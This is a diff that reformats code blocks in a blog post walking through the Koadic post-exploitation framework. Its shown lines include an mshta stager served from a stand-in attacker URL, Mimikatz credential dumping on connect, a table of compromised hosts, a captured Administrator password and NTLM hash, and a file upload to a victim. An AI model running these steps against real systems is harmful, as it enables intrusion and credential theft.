@@ -118,7 +118,7 @@
       
       
       
-        <span class="post-read-time">— 6 min read</span>
+        <span class="post-read-time">— 5 min read</span>
       
     </div>
 
@@ -186,9 +186,6 @@ When you start using Koadic obviously you need to pip3 the "reqs" and get it set
 Once you get an active session (zombie) the fun really begins. Because I had the module set to run Mimikatz immediately on connect you can see that plain-text creds are dumped as soon as the Windows Server 2012 host calls back to my attacking machine. You can see that both a  NTLM hash and plan-text credentials were recovered:
 
 
-
-<figure>
-
 ```bash
 (koadic: sta/js/mshta)$ run
 [+] Spawned a stager at http://AttackingIP:9999/sploit
@@ -232,8 +229,6 @@ win-lkc4723rphf\$  WORKGROUP        (null)
 <figcaption>
 <center>Dumping Creds on Connection</center>
 </figcaption>
-</figure>
-
 
 
 
@@ -241,10 +236,7 @@ win-lkc4723rphf\$  WORKGROUP        (null)
 If you want to check the status of the compromised hosts that you have so far you can use the command <b>[Zombies]</b>.
 </p>
 
-<figure>
-
-```bash
-
+<pre><code class="language-bash">
 (koadic: sta/js/mshta)$ zombies
 
         ID   IP              STATUS  LAST SEEN       
@@ -252,61 +244,52 @@ If you want to check the status of the compromised hosts that you have so far yo
         0    75.233.122.16   Dead    2019-08-03 04:22:37
         1*   171.31.92.16    Alive   2019-08-03 04:25:55
 
-Use "zombies ID" for detailed information about a session.
-Use "zombies IP" for sessions on a particular host.
-Use "zombies DOMAIN" for sessions on a particular Windows domain.
-Use "zombies killed" for sessions that have been manually killed.
-```
+Use &quot;zombies ID&quot; for detailed information about a session.
+Use &quot;zombies IP&quot; for sessions on a particular host.
+Use &quot;zombies DOMAIN&quot; for sessions on a particular Windows domain.
+Use &quot;zombies killed&quot; for sessions that have been manually killed.
+</code></pre>
+
 <figcaption>
 <center>Active and Dead Sessions</center>
 </figcaption>
-</figure>
 
 <p style="text-align:justify;">
 If you've got any active jobs running, the <b>[Jobs]</b> command will display them for you so you can see what finished and what failed:
 </p>
 
-<figure>
-
-```bash
-(koadic: sta/js/mshta)$ jobs
+<pre><code class="language-bash">(koadic: sta/js/mshta)$ jobs
 
         ID   STATUS    ZOMBIE              NAME                                    
         ---- --------- ----------          --------------------                    
         0    Complete  171.31.92.16 (1)    stager/js/mshta                         
-```
+</code></pre>
+
 <figcaption>
 <center>Koadic Displaying a jobs status</center>
 </figcaption>
-</figure>
 
 <p style="text-align:justify;">
 Similarly, <b>[Creds]</b> will display all of the credentials Koadic was able to capture and display them in nice, neat output for you:
 </p>
 
-<figure>
-
-```bash
-(koadic: sta/js/mshta)$ creds
+<pre><code class="language-bash">(koadic: sta/js/mshta)$ creds
 
         Cred ID  IP               USERNAME            DOMAIN              PASSWORD                 NTLM                                      
         -------  --               --------            ------              --------                 ----                                      
         0        171.31.92.16     Administrator       WIN-LKC4723RPHF     qLTWjy%P=9               9554475ea7e7f7c98c617ddbba4c55d8          
 
-```
+</code></pre>
+
 <figcaption>
 <center>Koadic Displaying Saved Creds</center>
 </figcaption>
-</figure>
 
 <p style="text-align:justify;">
 Koadic has a bunch of other handy modules. Just for a practicality I chose to show you guys the file upload utility. Here, I just uploaded a picture that I had lying around:
 </p>
 
-<figure>
-
-```bash
-(koadic: sta/js/mshta)$ use implant/util/upload_file
+<pre><code class="language-bash">(koadic: sta/js/mshta)$ use implant/util/upload_file
 (koadic: imp/uti/upload_file)$ options
 
         NAME        VALUE               REQ     DESCRIPTION     
@@ -316,18 +299,18 @@ Koadic has a bunch of other handy modules. Just for a practicality I chose to sh
         ZOMBIE      ALL                 yes     the zombie to target
 
 (koadic: imp/uti/upload_file)$ set LFILE Knuclkes.png
-[+] LFILE => Knuclkes.png
+[+] LFILE =&gt; Knuclkes.png
 (koadic: imp/uti/upload_file)$ set DIRECTORY c:\\users\\administrator\\desktop
-[+] DIRECTORY => c:\\users\\administrator\\desktop
+[+] DIRECTORY =&gt; c:\\users\\administrator\\desktop
 (koadic: imp/uti/upload_file)$ run
 [*] Zombie 0: Job 1 (implant/util/upload_file) created.
 [*] Zombie 1: Job 2 (implant/util/upload_file) created.
 [+] Zombie 1: Job 2 (implant/util/upload_file) completed.
-```
+</code></pre>
+
 <figcaption>
 <center>Options Used to Upload Files</center>
 </figcaption>
-</figure>
 
 <p>And the result:</p>
 
